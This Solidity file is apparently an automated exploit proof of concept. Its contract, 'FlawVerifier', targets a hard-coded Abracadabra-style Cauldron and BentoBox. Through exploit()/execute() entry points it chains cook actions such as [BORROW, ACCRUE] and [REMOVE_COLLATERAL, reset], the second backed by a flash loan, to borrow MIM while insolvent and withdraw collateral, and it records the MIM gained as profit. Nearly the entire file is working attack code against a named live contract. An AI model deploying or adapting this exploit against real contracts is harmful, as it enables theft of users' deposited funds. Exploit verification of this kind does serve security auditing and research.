// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IFlashBorrowerLike {
    function onFlashLoan(address sender, address token, uint256 amount, uint256 fee, bytes calldata data) external;
}

interface IBentoBoxLike {
    function balanceOf(address token, address account) external view returns (uint256 share);
    function deposit(address token, address from, address to, uint256 amount, uint256 share)
        external
        payable
        returns (uint256 amountOut, uint256 shareOut);
    function flashLoan(IFlashBorrowerLike borrower, address receiver, address token, uint256 amount, bytes calldata data)
        external;
    function toAmount(address token, uint256 share, bool roundUp) external view returns (uint256 amount);
    function toShare(address token, uint256 amount, bool roundUp) external view returns (uint256 share);
    function transfer(address token, address from, address to, uint256 share) external;
    function withdraw(address token, address from, address to, uint256 amount, uint256 share)
        external
        returns (uint256 amountOut, uint256 shareOut);
}

interface ICauldronLike {
    function BORROW_OPENING_FEE() external view returns (uint256);
    function addCollateral(address to, bool skim, uint256 share) external;
    function bentoBox() external view returns (address);
    function borrowLimit() external view returns (uint128 total, uint128 borrowPartPerAddress);
    function collateral() external view returns (address);
    function cook(uint8[] calldata actions, uint256[] calldata values, bytes[] calldata datas)
        external
        payable
        returns (uint256 value1, uint256 value2);
    function isSolvent(address user) external view returns (bool);
    function totalBorrow() external view returns (uint128 elastic, uint128 base);
    function updateExchangeRate() external returns (bool updated, uint256 rate);
    function userBorrowPart(address user) external view returns (uint256);
}

error Infeasible(bytes32 reason);

contract FlawVerifier is IFlashBorrowerLike {
    address public constant TARGET = 0xC6D3b82f9774Db8F92095b5e4352a8bB8B0dC20d;
    address public constant MIM = 0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3;

    uint8 internal constant ACTION_REMOVE_COLLATERAL = 4;
    uint8 internal constant ACTION_BORROW = 5;
    uint8 internal constant ACTION_ACCRUE = 8;
    uint8 internal constant ACTION_UNHANDLED = 100;

    uint256 internal constant BORROW_OPENING_FEE_PRECISION = 1e5;

    bool internal _executed;
    uint256 internal _profitAmount;

    address public bentoBoxAddress;
    address public collateralToken;

    bool public borrowPathAction8Used;
    bool public borrowPathAction100Used;
    bool public removePathAction8Used;
    bool public removePathAction100Used;
    bool public postBorrowSolvent;
    bool public hypothesisValidated;
    bool public hypothesisRefuted;

    uint256 public borrowedMimAmount;
    uint256 public borrowedMimShare;
    uint256 public flashCollateralAmount;
    uint256 public flashCollateralFee;
    uint256 public collateralShareAdded;
    uint256 public collateralShareRemoved;

    bytes32 public borrowFailureReason;
    bytes32 public removeFailureReason;

    constructor() {}

    receive() external payable {}

    function profitToken() external pure returns (address) {
        return MIM;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function executeOnOpportunity() external {
        _execute();
    }

    function execute() external {
        _execute();
    }

    function run() external {
        _execute();
    }

    function exploit() external {
        _execute();
    }

    function _execute() internal {
        if (_executed) {
            return;
        }
        _executed = true;

        ICauldronLike cauldron = ICauldronLike(TARGET);
        bentoBoxAddress = cauldron.bentoBox();
        collateralToken = cauldron.collateral();

        _attemptBorrowPaths(cauldron);

        if (borrowedMimAmount != 0) {
            _attemptRemovePaths();
        } else {
            removeFailureReason = keccak256(bytes("remove-path-needs-live-debt"));
        }

        _profitAmount = IERC20Like(MIM).balanceOf(address(this));
        hypothesisValidated = ((borrowPathAction8Used || borrowPathAction100Used) && !postBorrowSolvent)
            || removePathAction8Used || removePathAction100Used;
        hypothesisRefuted = !hypothesisValidated;
    }

    function onFlashLoan(address sender, address token, uint256 amount, uint256 fee, bytes calldata data) external override {
        if (msg.sender != bentoBoxAddress) revert Infeasible(keccak256(bytes("bad-bento-callback")));
        if (sender != address(this)) revert Infeasible(keccak256(bytes("bad-flash-sender")));
        if (token != collateralToken) revert Infeasible(keccak256(bytes("bad-flash-token")));

        uint8 resetAction = abi.decode(data, (uint8));
        if (resetAction != ACTION_ACCRUE && resetAction != ACTION_UNHANDLED) {
            revert Infeasible(keccak256(bytes("bad-reset-action")));
        }

        ICauldronLike cauldron = ICauldronLike(TARGET);
        IBentoBoxLike bento = IBentoBoxLike(bentoBoxAddress);

        flashCollateralAmount = amount;
        flashCollateralFee = fee;

        _forceApprove(collateralToken, bentoBoxAddress, type(uint256).max);

        uint256 shareBefore = bento.balanceOf(collateralToken, address(this));

        // This is the minimal setup required to exercise the remove-collateral exploit path on a
        // live insolvent debt position created by the borrow path. The core exploit action remains
        // exactly [REMOVE_COLLATERAL, resetAction].
        (, uint256 shareOut) = bento.deposit(collateralToken, address(this), TARGET, amount, 0);
        if (shareOut == 0) revert Infeasible(keccak256(bytes("zero-collateral-share")));

        collateralShareAdded = shareOut;
        cauldron.addCollateral(address(this), true, shareOut);

        // If Bento charges a non-zero fee and the collateral is not MIM, this path can become
        // economically infeasible without an external swap. The verifier therefore searches for a
        // dust flashloan where Bento rounds the fee to zero, preserving the exact exploit causality.
        if (!_tryRemoveCook(resetAction, shareOut)) {
            revert Infeasible(
                resetAction == ACTION_ACCRUE
                    ? keccak256(bytes("remove-cook-action8-failed"))
                    : keccak256(bytes("remove-cook-action100-failed"))
            );
        }

        uint256 shareAfter = bento.balanceOf(collateralToken, address(this));
        uint256 removedShare = shareAfter > shareBefore ? shareAfter - shareBefore : 0;
        if (removedShare == 0) revert Infeasible(keccak256(bytes("no-collateral-returned")));

        collateralShareRemoved = removedShare;
        bento.withdraw(collateralToken, address(this), address(this), 0, removedShare);

        uint256 repayment = amount + fee;
        if (IERC20Like(collateralToken).balanceOf(address(this)) < repayment) {
            revert Infeasible(keccak256(bytes("flash-repayment-shortfall")));
        }

        _safeTransfer(collateralToken, bentoBoxAddress, repayment);
    }

    function _attemptBorrowPaths(ICauldronLike cauldron) internal {
        _attemptBorrowPath(cauldron, ACTION_ACCRUE);
        _attemptBorrowPath(cauldron, ACTION_UNHANDLED);

        try cauldron.updateExchangeRate() {} catch {}
        try cauldron.isSolvent(address(this)) returns (bool solventNow) {
            postBorrowSolvent = solventNow;
        } catch {
            postBorrowSolvent = false;
        }

        if (borrowedMimAmount == 0 && borrowFailureReason == bytes32(0)) {
            borrowFailureReason = keccak256(bytes("all-borrow-paths-failed"));
        }
    }

    function _attemptBorrowPath(ICauldronLike cauldron, uint8 resetAction) internal {
        uint256 maxBorrowAmount = _maxBorrowableAmount(cauldron);
        if (maxBorrowAmount == 0) {
            if (borrowFailureReason == bytes32(0)) {
                borrowFailureReason = keccak256(bytes("no-liquidity-or-borrow-cap"));
            }
            return;
        }

        uint256[8] memory attempts = [
            maxBorrowAmount,
            (maxBorrowAmount * 99) / 100,
            (maxBorrowAmount * 95) / 100,
            (maxBorrowAmount * 90) / 100,
            maxBorrowAmount / 2,
            maxBorrowAmount / 4,
            maxBorrowAmount / 10,
            uint256(1)
        ];

        for (uint256 i = 0; i < attempts.length; i++) {
            uint256 candidate = attempts[i];
            if (candidate == 0) {
                continue;
            }
            if (_tryBorrowCook(resetAction, candidate)) {
                if (resetAction == ACTION_ACCRUE) {
                    borrowPathAction8Used = true;
                } else {
                    borrowPathAction100Used = true;
                }
                return;
            }
        }

        borrowFailureReason = resetAction == ACTION_ACCRUE
            ? keccak256(bytes("borrow-action8-reverted"))
            : keccak256(bytes("borrow-action100-reverted"));
    }

    function _attemptRemovePaths() internal {
        _attemptRemovePath(ACTION_ACCRUE);
        if (!removePathAction8Used) {
            _attemptRemovePath(ACTION_UNHANDLED);
        }

        if (!removePathAction8Used && !removePathAction100Used && removeFailureReason == bytes32(0)) {
            removeFailureReason = keccak256(bytes("all-remove-paths-failed"));
        }
    }

    function _attemptRemovePath(uint8 resetAction) internal {
        IBentoBoxLike bento = IBentoBoxLike(bentoBoxAddress);

        uint256[8] memory candidateShares = [uint256(1), 2, 10, 100, 1000, 1e6, 1e12, 1e18];
        for (uint256 i = 0; i < candidateShares.length; i++) {
            uint256 amount;
            try bento.toAmount(collateralToken, candidateShares[i], false) returns (uint256 quotedAmount) {
                amount = quotedAmount;
            } catch {
                amount = 0;
            }

            if (amount == 0) {
                continue;
            }

            try bento.flashLoan(IFlashBorrowerLike(address(this)), address(this), collateralToken, amount, abi.encode(resetAction)) {
                if (resetAction == ACTION_ACCRUE) {
                    removePathAction8Used = true;
                } else {
                    removePathAction100Used = true;
                }
                return;
            } catch Error(string memory) {
                removeFailureReason = resetAction == ACTION_ACCRUE
                    ? keccak256(bytes("remove-action8-reverted"))
                    : keccak256(bytes("remove-action100-reverted"));
            } catch (bytes memory lowLevelData) {
                bytes32 decoded = _decodeInfeasibleReason(lowLevelData);
                removeFailureReason = decoded == bytes32(0)
                    ? (resetAction == ACTION_ACCRUE
                        ? keccak256(bytes("remove-action8-reverted"))
                        : keccak256(bytes("remove-action100-reverted")))
                    : decoded;
            }
        }
    }

    function _tryBorrowCook(uint8 resetAction, uint256 amount) internal returns (bool) {
        IBentoBoxLike bento = IBentoBoxLike(bentoBoxAddress);

        uint256 shareBefore = bento.balanceOf(MIM, address(this));
        uint256 balanceBefore = IERC20Like(MIM).balanceOf(address(this));

        uint8[] memory actions = new uint8[](2);
        actions[0] = ACTION_BORROW;
        actions[1] = resetAction;

        uint256[] memory values = new uint256[](2);
        bytes[] memory datas = new bytes[](2);
        datas[0] = abi.encode(_toInt256(amount), address(this));
        datas[1] = bytes("");

        // Core exploit path: [BORROW, ACTION_ACCRUE] or [BORROW, 100].
        try ICauldronLike(TARGET).cook(actions, values, datas) returns (uint256, uint256) {
            uint256 shareAfter = bento.balanceOf(MIM, address(this));
            uint256 gainedShare = shareAfter > shareBefore ? shareAfter - shareBefore : 0;

            if (gainedShare != 0) {
                borrowedMimShare += gainedShare;
                borrowedMimAmount += bento.toAmount(MIM, gainedShare, false);
                bento.withdraw(MIM, address(this), address(this), 0, gainedShare);
            } else {
                uint256 balanceAfter = IERC20Like(MIM).balanceOf(address(this));
                if (balanceAfter > balanceBefore) {
                    uint256 gainedAmount = balanceAfter - balanceBefore;
                    borrowedMimAmount += gainedAmount;
                    try bento.toShare(MIM, gainedAmount, false) returns (uint256 quotedShare) {
                        borrowedMimShare += quotedShare;
                    } catch {}
                }
            }

            return IERC20Like(MIM).balanceOf(address(this)) > balanceBefore;
        } catch {
            return false;
        }
    }

    function _tryRemoveCook(uint8 resetAction, uint256 share) internal returns (bool) {
        uint8[] memory actions = new uint8[](2);
        actions[0] = ACTION_REMOVE_COLLATERAL;
        actions[1] = resetAction;

        uint256[] memory values = new uint256[](2);
        bytes[] memory datas = new bytes[](2);
        datas[0] = abi.encode(_toInt256(share), address(this));
        datas[1] = bytes("");

        // Core exploit path: [REMOVE_COLLATERAL, ACTION_ACCRUE] or [REMOVE_COLLATERAL, 100].
        try ICauldronLike(TARGET).cook(actions, values, datas) returns (uint256, uint256) {
            return true;
        } catch {
            return false;
        }
    }

    function _maxBorrowableAmount(ICauldronLike cauldron) internal view returns (uint256 amount) {
        IBentoBoxLike bento = IBentoBoxLike(bentoBoxAddress);

        uint256 availableShare = bento.balanceOf(MIM, TARGET);
        uint256 availableAmount = bento.toAmount(MIM, availableShare, false);
        if (availableAmount == 0) {
            return 0;
        }

        (uint128 totalCap, uint128 perAddressCap) = cauldron.borrowLimit();
        (uint128 elastic, uint128 base) = cauldron.totalBorrow();
        uint256 currentPart = cauldron.userBorrowPart(address(this));

        uint256 remainingTotal = totalCap > elastic ? uint256(totalCap - elastic) : 0;
        uint256 remainingPart = perAddressCap > currentPart ? uint256(perAddressCap) - currentPart : 0;
        if (remainingTotal == 0 || remainingPart == 0) {
            return 0;
        }

        uint256 fee = cauldron.BORROW_OPENING_FEE();
        uint256 partLimitedElastic;
        if (base == 0 || elastic == 0) {
            partLimitedElastic = remainingPart;
        } else {
            partLimitedElastic = (remainingPart * uint256(elastic)) / uint256(base);
        }

        uint256 grossBound = _min(availableAmount, _min(remainingTotal, partLimitedElastic));
        if (grossBound == 0) {
            return 0;
        }

        amount = (grossBound * BORROW_OPENING_FEE_PRECISION) / (BORROW_OPENING_FEE_PRECISION + fee);
        if (amount > 1e6) {
            amount -= 1e6;
        } else if (amount > 1) {
            amount -= 1;
        }
    }

    function _decodeInfeasibleReason(bytes memory data) internal pure returns (bytes32 reason) {
        if (data.length < 68) {
            return bytes32(0);
        }

        bytes4 selector;
        assembly {
            selector := mload(add(data, 32))
        }

        if (selector != Infeasible.selector) {
            return bytes32(0);
        }

        assembly {
            reason := mload(add(data, 68))
        }
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        try IERC20Like(token).allowance(address(this), spender) returns (uint256 allowed) {
            if (allowed >= amount) {
                return;
            }
        } catch {}

        _safeApprove(token, spender, 0);
        _safeApprove(token, spender, amount);
    }

    function _safeApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory ret) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        require(ok && (ret.length == 0 || abi.decode(ret, (bool))), "approve-failed");
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory ret) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(ok && (ret.length == 0 || abi.decode(ret, (bool))), "transfer-failed");
    }

    function _min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }

    function _toInt256(uint256 value) internal pure returns (int256) {
        require(value <= uint256(type(int256).max), "int-overflow");
        return int256(value);
    }
}
